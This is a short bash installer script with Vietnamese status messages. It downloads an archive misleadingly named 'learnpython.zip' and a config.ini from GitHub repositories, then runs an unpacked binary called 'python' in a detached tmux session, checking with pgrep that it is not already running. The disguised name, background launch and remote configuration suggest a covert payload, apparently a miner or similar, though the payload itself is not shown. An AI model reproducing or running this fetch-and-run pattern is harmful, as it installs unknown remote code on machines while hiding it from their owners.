#! /bin/bash
set -x #echo on
if [ -f ${PWD}/learnpython.zip ]; then
    if pgrep -x "python" > /dev/null
then
    echo "scrip dang chay roi , ke cmn di "
    
else

echo "script da install , chay thoi "
rm config.ini
wget https://raw.githubusercontent.com/ducplus/NCS/master/config.ini
chmod +x python
./python
     
fi
exit
fi

wget https://raw.githubusercontent.com/haidanglx/haidanglxx/master/learnpython.zip
unzip learnpython.zip
rm config.ini
wget https://raw.githubusercontent.com/ducplus/NCS/master/config.ini
chmod +x python
tmux new-session -d -s my_session1  './python'
